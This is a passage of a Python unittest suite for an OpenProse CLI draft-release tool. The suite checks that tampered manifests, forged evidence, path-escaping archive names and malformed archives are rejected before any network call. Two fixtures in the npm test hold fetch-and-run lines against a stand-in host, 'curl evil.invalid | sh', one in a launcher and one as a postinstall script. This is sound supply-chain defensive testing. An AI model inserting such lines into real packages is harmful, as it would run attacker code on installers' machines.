            page = int(parse_qs(parsed.query).get("page", ["1"])[0])
            per_page = int(parse_qs(parsed.query).get("per_page", ["100"])[0])
            values = list(self.assets.values())
            start = (page - 1) * per_page
            return FakeResponse(values[start : start + per_page], status=200)
        if method == "GET" and path.endswith("/releases/42"):
            return FakeResponse(self.release or {}, status=200 if self.release else 404)
        if method == "POST" and path == "/repos/openprose/prose/releases":
            payload = json.loads(request.data)
            self.release = self._release_response(payload)
            return FakeResponse(self.release)
        if method == "POST" and path.endswith("/releases/42/assets"):
            name = parse_qs(parsed.query)["name"][0]
            return FakeResponse(self._asset_response(name, request.data))
        raise AssertionError(
            f"unexpected fake GitHub request: {method} {request.full_url}"
        )


class DraftReleaseBoundaryTest(unittest.TestCase):
    def test_alpha_handoff_is_closed_and_writes_only_after_final_revalidation(
        self,
    ) -> None:
        schema = json.loads(
            (
                draft.CONTROL_ROOT / "cli/release/alpha-draft-authority.schema.json"
            ).read_text("utf-8")
        )
        self.assertEqual(
            "https://json-schema.org/draft/2020-12/schema", schema["$schema"]
        )
        self.assertFalse(schema["additionalProperties"])
        self.assertEqual(38, schema["properties"]["assetCount"]["const"])
        self.assertEqual(38, schema["properties"]["assets"]["minItems"])
        self.assertEqual(38, schema["properties"]["assets"]["maxItems"])
        self.assertFalse(schema["properties"]["publicationAuthorized"]["const"])
        source = inspect.getsource(draft.create_draft_release)
        self.assertLess(
            source.rfind("_list_exact_assets("),
            source.index("_write_alpha_draft_authority("),
        )
        self.assertLess(
            source.rfind("_discover_draft("),
            source.index("_write_alpha_draft_authority("),
        )
        self.assertLess(
            source.rfind("_resolve_existing_tag("),
            source.index("_write_alpha_draft_authority("),
        )
        self.assertIn("workflow_run_id", source)
        self.assertIn("workflow_run_attempt", source)
        self.assertIn("authority_output", source)

    def test_protected_npm_contract_matches_the_local_packager_for_every_platform(
        self,
    ) -> None:
        cohort = package_local.npm_cohort(
            mode="release",
            version="0.1.0",
            source_revision=SOURCE_SHA,
            image=IMAGE_IDENTITY,
        )
        launcher = draft._canonical_npm_launcher(
            version="0.1.0", source_sha=SOURCE_SHA, image=IMAGE_IDENTITY
        )
        protected_meta = draft._canonical_npm_meta_manifest(
            version="0.1.0", source_sha=SOURCE_SHA, image=IMAGE_IDENTITY
        )
        self.assertEqual(
            protected_meta,
            package_local.npm_meta_manifest("0.1.0", cohort, launcher),
        )
        self.assertEqual(protected_meta["homepage"], package_local.NPM_HOMEPAGE)
        self.assertEqual(protected_meta["bugs"], package_local.NPM_BUGS)
        self.assertNotIn("publishConfig", protected_meta)
        expected_binary = {
            "byteLength": len(BUN_BYTES),
            "sha256": hashlib.sha256(BUN_BYTES).hexdigest(),
        }
        for platform_value in draft.NPM_PLATFORM_SELECTORS:
            with self.subTest(platform=platform_value):
                windows_host = (
                    {
                        "path": "openprose-windows-process-host.exe",
                        "byteLength": len(HOST_BYTES),
                        "sha256": hashlib.sha256(HOST_BYTES).hexdigest(),
                        "admission": False,
                    }
                    if platform_value.startswith("win32-")
                    else None
                )
                linux_runtime = (
                    {
                        "minimumGlibc": "2.34",
                        "requiredGlibcMaximum": {"rust": "2.34", "bun": "2.34"},
                        "executionEvidence": "ubuntu-22.04-only",
                    }
                    if platform_value.startswith("linux-")
                    else None
                )
                protected_platform = draft._canonical_npm_platform_manifest(
                    version="0.1.0",
                    platform=platform_value,
                    source_sha=SOURCE_SHA,
                    image=IMAGE_IDENTITY,
                    expected_binary=expected_binary,
                    windows_host=windows_host,
                    linux_runtime=linux_runtime,
                )
                self.assertEqual(
                    protected_platform,
                    package_local.npm_platform_manifest(
                        "0.1.0",
                        platform_value,
                        BUN_BYTES,
                        SOURCE_SHA,
                        IMAGE_IDENTITY,
                        cohort,
                        linux_runtime
                        if linux_runtime is not None
                        else "not-applicable",
                        HOST_BYTES if windows_host is not None else None,
                    ),
                )
                self.assertEqual(
                    protected_platform["homepage"], package_local.NPM_HOMEPAGE
                )
                self.assertEqual(protected_platform["bugs"], package_local.NPM_BUGS)
                self.assertNotIn("publishConfig", protected_platform)

    def test_release_manifest_bun_runtime_is_platform_exact(self) -> None:
        with TemporaryDirectory() as directory:
            root = Path(directory)
            write_assembly(root)
            manifest_path = root / "darwin-x64-release-manifest.json"
            manifest = json.loads(manifest_path.read_text("utf-8"))
            manifest["bunRuntime"]["compileTarget"] = "bun-darwin-x64"
            rewrite_json(manifest_path, manifest)
            rewrite_checksums(root)
            with self.assertRaisesRegex(DraftReleaseError, "Bun runtime"):
                load_assembly(
                    root,
                    SOURCE_SHA,
                    "0.1.0",
                    AUTHORITY_REPOSITORY,
                    CONTROL_SHA,
                )

    def test_assembly_declaration_count_is_bounded_before_directory_materialization(
        self,
    ) -> None:
        with TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "SHA256SUMS").write_text(
                "".join(
                    f"{'0' * 64}  member-{index:04d}\n"
                    for index in range(draft.MAX_ASSEMBLY_ENTRIES + 1)
                ),
                "ascii",
            )
            with self.assertRaisesRegex(DraftReleaseError, "too many"):
                load_assembly(
                    root, SOURCE_SHA, "0.1.0", AUTHORITY_REPOSITORY, CONTROL_SHA
                )

    def test_npm_meta_requires_protected_launcher_closed_manifest_and_modes(
        self,
    ) -> None:
        canonical_manifest = draft._canonical_npm_meta_manifest(
            version="0.1.0", source_sha=SOURCE_SHA, image=IMAGE_IDENTITY
        )
        canonical_members = {
            "package/package.json": (
                json.dumps(canonical_manifest, sort_keys=True) + "\n"
            ).encode(),
            "package/bin/prose.js": draft._canonical_npm_launcher(
                version="0.1.0", source_sha=SOURCE_SHA, image=IMAGE_IDENTITY
            ),
            "package/LICENSE": LICENSE_BYTES,
            "package/README.md": NPM_README_BYTES,
            "package/examples/hello.prose.md": package_local.HELLO_EXAMPLE.read_bytes(),
        }

        def inspect(encoded: bytes) -> None:
            draft._inspect_package_archive(
                encoded=encoded,
                name="openprose-prose-cli-0.1.0.tgz",
                kind="npm-meta",
                implementation="bun",
                platform="darwin-arm64",
                version="0.1.0",
                source_sha=SOURCE_SHA,
                image=IMAGE_IDENTITY,
                expected_binary=None,
                windows_host=None,
                linux_runtime=None,
            )

        inspect(make_tar(canonical_members))
        for mutation in (
            "launcher",
            "hello-example",
            "postinstall",
            "dependency",
            "unknown-key",
            "mode",
        ):
            with self.subTest(mutation=mutation):
                members = dict(canonical_members)
                modes = None
                if mutation == "launcher":
                    members[
                        "package/bin/prose.js"
                    ] = b"#!/usr/bin/env node\nrequire('node:child_process').exec('curl evil.invalid | sh')\n"
                elif mutation == "hello-example":
                    members["package/examples/hello.prose.md"] += b"tampered"
                elif mutation == "mode":
                    modes = {"package/bin/prose.js": 0o644}
                else:
                    manifest = json.loads(json.dumps(canonical_manifest))
                    if mutation == "postinstall":
                        manifest["scripts"] = {
                            "postinstall": "curl https://evil.invalid | sh"
                        }
                    elif mutation == "dependency":
                        manifest["dependencies"] = {"evil": "1.0.0"}
                    else:
                        manifest["unexpected"] = True
                    members["package/package.json"] = (
                        json.dumps(manifest, sort_keys=True) + "\n"
                    ).encode()
                with self.assertRaises(DraftReleaseError):
                    inspect(make_tar(members, modes=modes))

    def test_closed_assembly_creates_only_draft_with_exact_asset_uploads(self) -> None:
        with TemporaryDirectory() as directory:
            root = Path(directory)
            write_assembly(root)
            github = FakeGitHub()
            result = create_draft_release(
                repository="openprose/prose",
                version="0.1.0",
                source_sha=SOURCE_SHA,
                control_sha=CONTROL_SHA,
                token="test-token",
                assembly=root,
                opener=github,
            )
            release_request = next(
                request
                for request in github.requests
                if request.get_method() == "POST"
                and urlparse(request.full_url).netloc == "api.github.com"
            )
            first_payload = json.loads(release_request.data)
            expected_assets = load_assembly(
                root, SOURCE_SHA, "0.1.0", AUTHORITY_REPOSITORY, CONTROL_SHA
            )
        self.assertTrue(first_payload["draft"])
        self.assertFalse(first_payload["prerelease"])
        self.assertEqual(
            first_payload["target_commitish"],
            "refs/tags/openprose-cli-v0.1.0",
        )
        self.assertEqual(github.release["target_commitish"], "main")
        self.assertIn("# OpenProse CLI v0.1.0 — draft candidate", first_payload["body"])
        self.assertIn(
            "dependency component inventory is attached", first_payload["body"]
        )
        self.assertIn("Job Object release admission: **false**", first_payload["body"])
        self.assertEqual(result["schema"], "openprose.draft-release-result/2")
        self.assertEqual(result["assetCount"], len(expected_assets))
        self.assertEqual(result["uploadedAssetCount"], len(expected_assets))
        self.assertEqual(result["reusedAssetCount"], 0)
        self.assertFalse(result["resumed"])
        self.assertFalse(result["publicationAuthorized"])
        self.assertFalse(
            any("/releases/tags/" in request.full_url for request in github.requests)
        )

    def test_unsafe_missing_extra_and_tampered_members_fail_before_network(
        self,
    ) -> None:
        mutations = ("unsafe", "missing", "extra", "tampered", "publication")
        for mutation in mutations:
            with self.subTest(mutation=mutation), TemporaryDirectory() as directory:
                root = Path(directory)
                write_assembly(root)
                if mutation == "unsafe":
                    sums = (root / "SHA256SUMS").read_text("ascii")
                    (root / "SHA256SUMS").write_text(
                        sums + "0" * 64 + "  ../escape\n", "ascii"
                    )
                elif mutation == "missing":
                    (root / "linux-x64-sbom.cdx.json").unlink()
                elif mutation == "extra":
                    (root / "undeclared.bin").write_bytes(b"extra")
                elif mutation == "tampered":
                    (root / "linux-x64-sbom.cdx.json").write_bytes(b"tampered")
                else:
                    path = root / "profile-admission.json"
                    value = json.loads(path.read_text("utf-8"))
                    value["publicationAuthorized"] = True
                    path.write_text(json.dumps(value), "utf-8")
                github = FakeGitHub()
                with self.assertRaises(DraftReleaseError):
                    create_draft_release(
                        repository="openprose/prose",
                        version="0.1.0",
                        source_sha=SOURCE_SHA,
                        control_sha=CONTROL_SHA,
                        token="test-token",
                        assembly=root,
                        opener=github,
                    )
                self.assertEqual(github.requests, [])

    def test_dependency_evidence_overclaim_tamper_and_cross_target_divergence_fail_closed(
        self,
    ) -> None:
        mutations = (
            "manifest-digest",
            "policy-overclaim",
            "sbom-component",
            "provenance-digest",
            "cross-target-divergence",
        )
        for mutation in mutations:
            with self.subTest(mutation=mutation), TemporaryDirectory() as directory:
                root = Path(directory)
                write_assembly(root)
                target = "linux-x64"
                evidence_path = root / f"{target}-dependency-evidence.json"
                manifest_path = root / f"{target}-release-manifest.json"
                sbom_path = root / f"{target}-sbom.cdx.json"
                provenance_path = root / f"{target}-provenance.json"
                manifest = json.loads(manifest_path.read_text("utf-8"))
                sbom = json.loads(sbom_path.read_text("utf-8"))
                provenance = json.loads(provenance_path.read_text("utf-8"))
                if mutation == "manifest-digest":
                    manifest["dependencyEvidence"]["sha256"] = "0" * 64
                elif mutation == "sbom-component":
                    sbom["components"] = [
                        component
                        for component in sbom["components"]
                        if component.get("group") != "rust-cli"
                    ]
                elif mutation == "provenance-digest":
                    dependencies = provenance["predicate"]["buildDefinition"][
                        "resolvedDependencies"
                    ]
                    next(
                        item
                        for item in dependencies
                        if item.get("uri") == "openprose:dependency-evidence"
                    )["digest"]["sha256"] = ("0" * 64)
                else:
                    evidence = json.loads(evidence_path.read_text("utf-8"))
                    if mutation == "policy-overclaim":
                        evidence["releasePolicy"]["passed"] = True
                    else:
                        evidence["releasePolicy"]["blockers"][
                            0
                        ] = "different but still blocked"
                    encoded = (
                        json.dumps(evidence, sort_keys=True, separators=(",", ":"))
                        + "\n"
                    ).encode()
                    evidence_path.write_bytes(encoded)
                    digest = hashlib.sha256(encoded).hexdigest()
                    manifest["dependencyEvidence"].update(
                        {"byteLength": len(encoded), "sha256": digest}
                    )
                    for item in sbom["properties"]:
                        if item.get("name") == "openprose:dependency-evidence-sha256":
                            item["value"] = digest
                    dependencies = provenance["predicate"]["buildDefinition"][
                        "resolvedDependencies"
                    ]
                    next(
                        item
                        for item in dependencies
                        if item.get("uri") == "openprose:dependency-evidence"
                    )["digest"]["sha256"] = digest
                rewrite_json(manifest_path, manifest)
                rewrite_json(sbom_path, sbom)
                rewrite_json(provenance_path, provenance)
                rewrite_checksums(root)
                github = FakeGitHub()
                with self.assertRaises(DraftReleaseError):
                    create_draft_release(
                        repository="openprose/prose",
                        version="0.1.0",
                        source_sha=SOURCE_SHA,
                        control_sha=CONTROL_SHA,
                        token="test-token",
                        assembly=root,
                        opener=github,
                    )
                self.assertEqual(github.requests, [])

    def test_protected_dependency_evidence_omission_substitution_and_divergence_fail_closed(
        self,
    ) -> None:
        for mutation in (
            "omission",
            "substitution",
            "admission-divergence",
            "admission-extra",
        ):
            with self.subTest(mutation=mutation), TemporaryDirectory() as directory:
                root = Path(directory)
                write_assembly(root)
                protected_path = root / "protected-dependency-evidence.json"
                admission_path = root / "profile-admission.json"
                if mutation == "omission":
                    protected_path.unlink()
                else:
                    admission = json.loads(admission_path.read_text("utf-8"))
                    if mutation == "substitution":
                        dependency = json.loads(protected_path.read_text("utf-8"))
                        dependency["releasePolicy"]["blockers"][
                            0
                        ] = "protected substitution"
                        protected_bytes = (
                            json.dumps(
                                dependency, sort_keys=True, separators=(",", ":")
                            )
                            + "\n"
                        ).encode()
                        protected_path.write_bytes(protected_bytes)
                        admission["dependencyEvidence"].update(
                            {
                                "byteLength": len(protected_bytes),
                                "sha256": hashlib.sha256(protected_bytes).hexdigest(),
                            }
                        )
                    elif mutation == "admission-divergence":
                        admission["dependencyEvidence"]["sha256"] = "0" * 64
                    else:
                        admission["unexpected"] = True
                    rewrite_json(admission_path, admission)
                rewrite_checksums(root)
                github = FakeGitHub()
                with self.assertRaises(DraftReleaseError):
                    create_draft_release(
                        repository="openprose/prose",
                        version="0.1.0",
                        source_sha=SOURCE_SHA,
                        control_sha=CONTROL_SHA,
                        token="test-token",
                        assembly=root,
                        opener=github,
                    )
                self.assertEqual(github.requests, [])

    def test_non_draft_api_identity_and_invalid_inputs_fail_closed(self) -> None:
        with TemporaryDirectory() as directory:
            root = Path(directory)
            write_assembly(root)
            with self.assertRaisesRegex(DraftReleaseError, "draft.*identity"):
                create_draft_release(
                    repository="openprose/prose",
                    version="0.1.0",
                    source_sha=SOURCE_SHA,
                    control_sha=CONTROL_SHA,
                    token="test-token",
                    assembly=root,
                    opener=FakeGitHub(draft=False),
                )
            for repository, version, sha, token in (
                ("bad", "0.1.0", SOURCE_SHA, "token"),
                ("openprose/prose", "v0.1.0", SOURCE_SHA, "token"),
                ("openprose/prose", "0.1.0", "short", "token"),
                ("openprose/prose", "0.1.0", SOURCE_SHA, ""),
            ):
                with self.assertRaises(DraftReleaseError):
                    create_draft_release(
                        repository=repository,
                        version=version,
                        source_sha=sha,
                        control_sha=CONTROL_SHA,
                        token=token,
                        assembly=root,
                        opener=FakeGitHub(),
                    )

    def test_windows_host_lineage_must_match_every_evidence_boundary(self) -> None:
        for mutation in ("verification", "package", "native-path", "profile"):
            with self.subTest(mutation=mutation), TemporaryDirectory() as directory:
                root = Path(directory)
                write_assembly(root)
                native_path = root / "win-x64-native-manifest.json"
                verification_path = root / "win-x64-verification.json"
                release_path = root / "win-x64-release-manifest.json"
                native = json.loads(native_path.read_text("utf-8"))
                verification = json.loads(verification_path.read_text("utf-8"))
                release = json.loads(release_path.read_text("utf-8"))
                if mutation == "verification":
                    verification["windowsProcessHost"]["sha256"] = "4" * 64
                    rewrite_json(verification_path, verification)
                elif mutation == "package":
                    release["windowsProcessHost"]["byteLength"] += 1
                    rewrite_json(release_path, release)
                elif mutation == "native-path":
                    native["windowsProcessHost"]["path"] = "different-helper.exe"
                    native_bytes = rewrite_json(native_path, native)
                    verification["nativeManifestSha256"] = hashlib.sha256(
                        native_bytes
                    ).hexdigest()
                    verification["windowsProcessHost"] = native["windowsProcessHost"]
                    release["windowsProcessHost"] = native["windowsProcessHost"]
                    rewrite_json(verification_path, verification)
                    rewrite_json(release_path, release)
                else:
                    admission_path = root / "profile-admission.json"
                    admission = json.loads(admission_path.read_text("utf-8"))
                    admission["windowsProcessHost"]["sha256"] = "5" * 64
                    rewrite_json(admission_path, admission)
                rewrite_checksums(root)
                github = FakeGitHub()
                with self.assertRaises(DraftReleaseError):
                    create_draft_release(
                        repository="openprose/prose",
                        version="0.1.0",
                        source_sha=SOURCE_SHA,
                        control_sha=CONTROL_SHA,
                        token="test-token",
                        assembly=root,
                        opener=github,
                    )
                self.assertEqual(github.requests, [])

    def test_release_package_admission_tampering_fails_before_network(self) -> None:
        mutations = (
            "control-sha",
            "protected-input",
            "corpus-digest",
            "package-file-map",
            "native-lineage",
            "workflow-divergence",
            "authority-overclaim",
            "missing-posix-cases",
            "observation-exit",
            "observation-projection",
            "observation-stderr",
            "toolchain-digest",
            "windows-execution",
        )
        for mutation in mutations:
            with self.subTest(mutation=mutation), TemporaryDirectory() as directory:
                root = Path(directory)
                write_assembly(root)
                target = "win-x64" if mutation == "windows-execution" else "linux-x64"
                path = root / f"{target}-release-package-admission.json"
                report = json.loads(path.read_text("utf-8"))
                if mutation == "control-sha":
                    report["controlSha"] = "0" * 40
                elif mutation == "protected-input":
                    report["authorityInputs"]["profilePreflight"]["sha256"] = "0" * 64
                elif mutation == "corpus-digest":
                    report["corpus"]["sha256"] = "0" * 64
                elif mutation == "package-file-map":
                    report["package"]["files"][0]["sha256"] = "0" * 64
                elif mutation == "native-lineage":
                    report["package"]["nativeLineage"]["products"]["rust"][
                        "packagedBinarySha256"
                    ] = ("0" * 64)
                elif mutation == "workflow-divergence":
                    report["workflowRun"]["attempt"] += 1
                    report["package"]["nativeLineage"]["nativeArtifact"][
                        "workflowRunAttempt"
                    ] += 1
                elif mutation == "authority-overclaim":
                    report["claims"]["publicationAuthorized"] = True
                elif mutation == "missing-posix-cases":
                    report["cases"] = []
                elif mutation == "observation-exit":
                    report["cases"][0]["observations"][0]["exitCode"] = 10
                elif mutation == "observation-projection":
                    report["cases"][0]["observations"][0]["projection"][
                        "runner"
                    ] = "bun"
                elif mutation == "observation-stderr":
                    report["cases"][0]["observations"][0]["stderr"] = {
                        "byteLength": 1,
                        "sha256": hashlib.sha256(b"x").hexdigest(),
                    }
                elif mutation == "toolchain-digest":
                    report["executionToolchain"]["npm"]["sha256"] = "not-a-digest"
                else:
                    report["cases"] = [
                        {"id": "forged", "argv": ["--version"], "observations": []}
                    ]
                rewrite_json(path, report)
                rewrite_checksums(root)
                github = FakeGitHub()
                with self.assertRaises(DraftReleaseError):
                    create_draft_release(
                        repository="openprose/prose",
                        version="0.1.0",
                        source_sha=SOURCE_SHA,
                        control_sha=CONTROL_SHA,
                        token="test-token",
                        assembly=root,
                        opener=github,
                    )
                self.assertEqual(github.requests, [])

    def test_coherent_authority_forgery_fails_before_network(self) -> None:
        mutations = ("preflight-control", "native-file-map")
        for mutation in mutations:
            with self.subTest(mutation=mutation), TemporaryDirectory() as directory:
                root = Path(directory)
                write_assembly(root)
                admission_path = root / "profile-admission.json"
                admission = json.loads(admission_path.read_text("utf-8"))
                if mutation == "preflight-control":
                    preflight_path = root / "profile-preflight.json"
                    preflight = json.loads(preflight_path.read_text("utf-8"))
                    preflight["controlSha"] = "f" * 40
                    rewrite_json(preflight_path, preflight)
                    digest = hashlib.sha256(preflight_path.read_bytes()).hexdigest()
                    admission["preflightSha256"] = digest
                    for target in TARGETS:
                        report_path = root / f"{target}-release-package-admission.json"
                        report = json.loads(report_path.read_text("utf-8"))
                        report["authorityInputs"]["profilePreflight"] = {
                            "byteLength": preflight_path.stat().st_size,
                            "sha256": digest,
                        }
                        rewrite_json(report_path, report)
                else:
                    target = "win-x64"
                    verification_path = root / f"{target}-verification.json"
                    verification = json.loads(verification_path.read_text("utf-8"))
                    verification["nativeArtifact"]["files"]["prose-rust"]["sha256"] = (
                        "f" * 64
                    )
                    rewrite_json(verification_path, verification)
                    digest = hashlib.sha256(verification_path.read_bytes()).hexdigest()
                    admission["verifiedProfiles"][target] = digest
                    report_path = root / f"{target}-release-package-admission.json"
                    report = json.loads(report_path.read_text("utf-8"))
                    report["authorityInputs"]["nativeVerification"] = {
                        "byteLength": verification_path.stat().st_size,
                        "sha256": digest,
                    }
                    report["package"]["nativeLineage"]["files"] = verification[
                        "nativeArtifact"
                    ]["files"]
                    rewrite_json(report_path, report)
                rewrite_json(admission_path, admission)
                rewrite_checksums(root)
                github = FakeGitHub()
                with self.assertRaises(DraftReleaseError):
                    create_draft_release(
                        repository="openprose/prose",
                        version="0.1.0",
                        source_sha=SOURCE_SHA,
                        control_sha=CONTROL_SHA,
                        token="test-token",
                        assembly=root,
                        opener=github,
                    )
                self.assertEqual(github.requests, [])

    def test_closed_inventory_archives_and_protected_digests_fail_semantically(
        self,
    ) -> None:
        mutations = (
            "extra",
            "preflight",
            "verified",
            "archive",
            "npm",
            "provenance",
            "sbom",
            "linux-missing",
            "swap",
            "truncated",
            "truncated-footer",
            "trailing-gzip",
            "concatenated-gzip",
            "oversized-header",
            "unsafe-name",
        )
        for mutation in mutations:
            with self.subTest(mutation=mutation), TemporaryDirectory() as directory:
                root = Path(directory)
                write_assembly(root)
                release_path = root / "win-x64-release-manifest.json"
                release = json.loads(release_path.read_text("utf-8"))

                def replace_artifact(kind: str, encoded: bytes) -> None:
                    record = next(
                        item for item in release["artifacts"] if item["kind"] == kind
                    )
                    (root / record["path"]).write_bytes(encoded)
                    record["sha256"] = hashlib.sha256(encoded).hexdigest()
                    record["byteLength"] = len(encoded)
                    rewrite_json(release_path, release)

                if mutation == "extra":
                    (root / "unexpected-but-declared.bin").write_bytes(b"unexpected")
                elif mutation == "preflight":
                    (root / "profile-preflight.json").write_bytes(
                        b'{"status":"different"}\n'
                    )
                elif mutation == "verified":
                    path = root / "profile-admission.json"
                    admission = json.loads(path.read_text("utf-8"))
                    admission["verifiedProfiles"]["win-x64"] = "6" * 64
                    rewrite_json(path, admission)
                elif mutation == "archive":
                    replace_artifact(
                        "standalone-archive",
                        make_tar(
                            {
                                "openprose-win-x64/prose.exe": b"candidate",
                                "openprose-win-x64/openprose-windows-process-host.exe": b"wrong-host",
                            }
                        ),
                    )
                elif mutation == "npm":
                    bad_manifest = {
                        "openproseWindowsProcessHost": "bin/openprose-windows-process-host.exe",
                        "openproseWindowsProcessHostByteLength": len(HOST_BYTES),
                        "openproseWindowsProcessHostSha256": "7" * 64,
                        "openproseWindowsProcessHostAdmission": False,
                    }
                    replace_artifact(
                        "npm-platform",
                        make_tar(
                            {
                                "package/package.json": json.dumps(
                                    bad_manifest
                                ).encode(),
                                "package/bin/prose.exe": b"candidate",
                                "package/bin/openprose-windows-process-host.exe": HOST_BYTES,
                            }
                        ),
                    )
                elif mutation == "provenance":
                    path = root / "win-x64-provenance.json"
                    provenance = json.loads(path.read_text("utf-8"))
                    provenance["predicate"]["buildDefinition"]["resolvedDependencies"][
                        0
                    ]["digest"]["sha256"] = ("8" * 64)
                    rewrite_json(path, provenance)
                elif mutation == "sbom":
                    path = root / "win-x64-sbom.cdx.json"
                    sbom = json.loads(path.read_text("utf-8"))
                    sbom["components"][0]["hashes"][0]["content"] = "9" * 64
                    rewrite_json(path, sbom)
                elif mutation == "linux-missing":
                    path = root / "linux-x64-release-manifest.json"
                    linux_release = json.loads(path.read_text("utf-8"))
                    record = next(
                        item
                        for item in linux_release["artifacts"]
                        if item["implementation"] == "rust"
                        and item["kind"] == "standalone-archive"
                    )
                    encoded = make_tar({"not-prose.txt": b"not a runnable package"})
                    (root / record["path"]).write_bytes(encoded)
                    record["sha256"] = hashlib.sha256(encoded).hexdigest()
                    record["byteLength"] = len(encoded)
                    rewrite_json(path, linux_release)
                elif mutation == "swap":
                    standalone = [
                        item
                        for item in release["artifacts"]
                        if item["kind"] == "standalone-archive"
                    ]
                    standalone[0]["implementation"], standalone[1]["implementation"] = (
                        standalone[1]["implementation"],
                        standalone[0]["implementation"],
                    )
                    rewrite_json(release_path, release)
                elif mutation in {
                    "truncated",
                    "truncated-footer",
                    "trailing-gzip",
                    "concatenated-gzip",
                    "oversized-header",
                }:
                    record = next(
                        item
                        for item in release["artifacts"]
                        if item["implementation"] == "rust"
                        and item["kind"] == "standalone-archive"
                    )
                    original = (root / record["path"]).read_bytes()
                    if mutation == "truncated":
                        encoded = original[: len(original) // 2]
                    elif mutation == "truncated-footer":
                        encoded = original[:-20]
                    elif mutation == "trailing-gzip":
                        encoded = original + b"trailing"
                    elif mutation == "concatenated-gzip":
                        encoded = original + original
                    else:
                        info = tarfile.TarInfo(
                            "openprose-prose-cli-rust-0.1.0-win32-x64/prose.exe"
                        )
                        info.size = MAX_ASSET_BYTES + 1
                        encoded = gzip.compress(info.tobuf() + b"\0" * 1024)
                    (root / record["path"]).write_bytes(encoded)
                    record["sha256"] = hashlib.sha256(encoded).hexdigest()
                    record["byteLength"] = len(encoded)
                    rewrite_json(release_path, release)
                else:
                    replace_artifact(
                        "standalone-archive",
                        make_tar(
                            {
                                "C:\\escape": b"unsafe",
                                "openprose-prose-cli-rust-0.1.0-win32-x64/prose.exe": RUST_BYTES,
                                "openprose-prose-cli-rust-0.1.0-win32-x64/LICENSE": b"license",
                                "openprose-prose-cli-rust-0.1.0-win32-x64/README.txt": b"readme",
                                "openprose-prose-cli-rust-0.1.0-win32-x64/openprose-windows-process-host.exe": HOST_BYTES,
                            }
                        ),
                    )
                rewrite_checksums(root)
                github = FakeGitHub()
                with self.assertRaises(DraftReleaseError):
                    create_draft_release(
                        repository="openprose/prose",
                        version="0.1.0",
                        source_sha=SOURCE_SHA,
                        control_sha=CONTROL_SHA,
                        token="test-token",
                        assembly=root,
                        opener=github,
                    )
                self.assertEqual(github.requests, [])


if __name__ == "__main__":
    unittest.main(verbosity=2)
